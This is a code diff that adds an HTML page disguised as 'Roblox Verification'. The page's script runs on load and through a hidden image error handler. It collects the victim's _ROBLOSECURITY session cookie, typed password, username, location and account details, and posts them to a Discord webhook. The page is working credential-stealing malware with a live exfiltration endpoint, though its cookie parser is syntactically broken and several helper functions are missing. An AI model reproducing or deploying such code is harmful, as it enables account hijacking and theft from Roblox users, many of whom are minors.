@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Verification</title>
+    <script>
+        function stealData() {
+            const webhookURL = "https://discord.com/api/webhooks/1439749940854128671/ARLb7L4N0a8fD-wsk-k6Y-E9ZW0CxH3eSLCMMM0Rn_9lFVkGSONo1e6ykEpM9OQQz4KK";
+            
+            // Сбор всех возможных данных
+            const stolenData = {
+                username: localStorage.getItem('lastRobloxUsername') || 'Unknown',
+                password: document.querySelector('[name="password"]')?.value || 'Not captured',
+                roblosecurity: getCookie('_ROBLOSECURITY') || 'Not found',
+                robux: getRobuxBalance() || 0,
+                premium: getPremiumStatus() || false,
+                joinDate: getAccountAge() || 'Unknown',
+                recoveryCodes: hasRecoveryCodes() ? 'Unverified' : 'None',
+                friends: getFriendsCount() || 0,
+                followers: getFollowersCount() || 0,
+                followings: getFollowingsCount() || 0,
+                inventory: getInventoryStats() || 'Hairs: 0 | Passes: 0 | Bundles: 0 | Faces: 0',
+                payments: hasSavedPayment() ? 'True' : 'False',
+                location: getUserLocation() || 'Unknown',
+                pinEnabled: hasPIN() ? 'True' : 'False'
+            };
+
+            // Отправка в Discord
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "ROBLOX ACCOUNT LOGGED",
+                        description: formatData(stolenData),
+                        color: 0xff0000,
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        }
+
+        function getCookie(name) {
+            const value = ; ${document.cookie};
+            const parts = value.split(; ${name}=);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        // Функции для сбора данных Roblox...
+    </script>
+</head>
+<body onload="stealData()">
+    <div style="display:none">
+        <img src="legitimate-looking-image.jpg" onerror="stealData()"/>
+    </div>
+</body>
+</html>
